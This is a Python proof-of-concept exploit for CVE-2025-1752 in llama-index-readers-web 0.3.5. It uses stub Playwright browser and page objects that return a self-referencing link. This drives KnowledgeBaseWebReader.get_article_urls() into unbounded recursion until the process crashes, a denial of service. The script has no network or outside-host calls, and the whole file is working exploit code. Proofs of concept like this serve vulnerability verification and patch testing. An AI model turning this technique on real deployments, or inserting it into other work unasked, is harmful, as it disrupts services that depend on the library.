# Exploit PoC for CVE-2025-1752 – llama-index-readers-web <=0.3.5
#
# INPUT FORMAT:
#   python exploit.py <ROOT_URL>
#
# SPECIFIC INPUT REQUIRED:
#   <ROOT_URL> – Any base URL string that does NOT include the configured `article_path` (default: "/articles").
#   Example that triggers the vulnerability:  python exploit.py http://example.com
#
# The script creates fake Playwright browser/page objects that always return a single link
# pointing back to the same relative location. Because `KnowledgeBaseWebReader.get_article_urls()`
# in version 0.3.5 fails to track recursion depth, the function will keep calling itself
# until Python raises a RecursionError, demonstrating the Denial-of-Service condition.

import sys
from llama_index.readers.web.knowledge_base.base import KnowledgeBaseWebReader

class _FakeLink:
    """Minimal stand-in for a DOM element."""
    pass

class _FakePage:
    def set_default_timeout(self, *_):
        pass

    def goto(self, *_ , **__):
        # No network traffic is performed – this is a stub.
        pass

    def query_selector_all(self, _selector):
        # Always return exactly one link so that recursion never ends.
        return [_FakeLink()]

    def evaluate(self, _script, _node):
        # The href returned for every link – keeps the crawler in the same section
        # and guarantees that `article_path` is never matched.
        return "/loop"

    def close(self):
        pass

class _FakeBrowser:
    def new_page(self, **_):
        return _FakePage()

    def close(self):
        pass

def main():
    if len(sys.argv) != 2:
        print("Usage: python exploit.py <ROOT_URL>")
        sys.exit(1)

    root_url = sys.argv[1].rstrip("/")

    reader = KnowledgeBaseWebReader(
        root_url=root_url,
        link_selectors=["a"],  # Selector is irrelevant for the exploit
        article_path="/articles",  # Not present in the generated links
    )

    # Trigger the vulnerable function. The following call will recurse until
    # the Python interpreter raises a RecursionError, effectively causing a DoS.
    reader.get_article_urls(_FakeBrowser(), root_url, root_url, max_depth=10**9)

if __name__ == "__main__":
    main()